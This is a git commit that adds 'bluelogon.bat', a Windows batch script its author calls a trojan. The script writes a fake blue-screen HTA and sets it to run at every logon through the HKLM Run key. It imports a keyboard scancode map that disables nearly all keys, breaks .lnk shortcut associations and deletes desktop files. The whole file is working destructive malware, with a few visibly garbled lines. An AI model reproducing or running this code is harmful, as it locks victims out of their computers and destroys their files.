77c502635da1841338be45eb8071b0a28c70e7af
pankoza <77279607+pankoza-pl@users.noreply.github.com>
2022-03-04 19:04:52 +0100

    .bat trojan kinda inspired by BCLDK.exe

---
+++ bluelogon.bat
@@ -0,0 +1,76 @@
+@echo off
+title Bluelogon.bat
+echo This malware is no joke, continue?
+pause
+cls
+echo msgbox "You are trashed by BlueLogon trojan if you reboot or logoff you can't logon again" >x.vbs
+start wscript x.vbs
+ping localhost -n 1 >nul
+echo ^<html^>^<head^>^<title^>BSOD^
+</title^> > bsod.hta
+echo. >> bsod.hta
+echo ^<hta:application id="oBVC" >> bsod.hta
+echo applicationname="BSOD" >> bsod.hta
+echo version="1.0" >> bsod.hta
+echo maximizebutton="no" >> bsod.hta
+echo minimizebutton="no" >> bsod.hta
+echo sysmenu="no" >> bsod.hta
+echo Caption="no" >> bsod.hta
+echo windowstate="maximize"/^> >> bsod.hta
+echo. >> bsod.hta
+echo ^</head^>^<body bgcolor="#000088" scroll="no"^> >> bsod.hta
+echo ^<font face="Lucida Console" size="4" color="#FFFFFF"^> >> bsod.hta
+echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQ
+UAL^</p^> >> bsod.htaecho. >> bsod.hta
+echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Technical information:^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000
+000,0xF86B5A89)^</p^> >> bsod.htaecho. >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>*** gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Beginning dump of physical memory^</p^> >> bsod.hta
+echo ^<p^>Physical memory dump complete.^</p^> >> bsod.hta
+echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo. >> bsod.hta
+echo ^</font^> >> bsod.hta
+echo ^</body^>^</html^> >> bsod.hta
+copy /y bsod.hta c:\windows\startshell.hta
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v bsodhta /d "mshta c:\windows\startshell.hta" /f
+@echo off
+echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
+echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
+echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg"
+echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "nokeyboard.reg"
+echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "nokeyboard.reg"
+echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "nokeyboard.reg"
+echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "nokeyboard.reg"
+echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "nokeyboard.reg"
+echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "nokeyboard.reg"
+echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "nokeyboard.reg"
+echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "nokeyboard.reg"
+echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "nokeyboard.reg"
+echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "nokeyboard.reg"
+echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "nokeyboard.reg"
+echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "nokeyboard.reg"
+echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "nokeyboard.reg"
+echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "nokeyboard.reg"
+echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "nokeyboard.reg"
+echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "nokeyboard.reg"
+echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "nokeyboard.reg"
+echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "nokeyboard.reg"
+echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
+echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
+reg import nokeyboard.reg
+assoc .lnk=death%random%
+del c:\users\public\desktop\*.* /q
+del %userprofile%\desktop\*.* /q
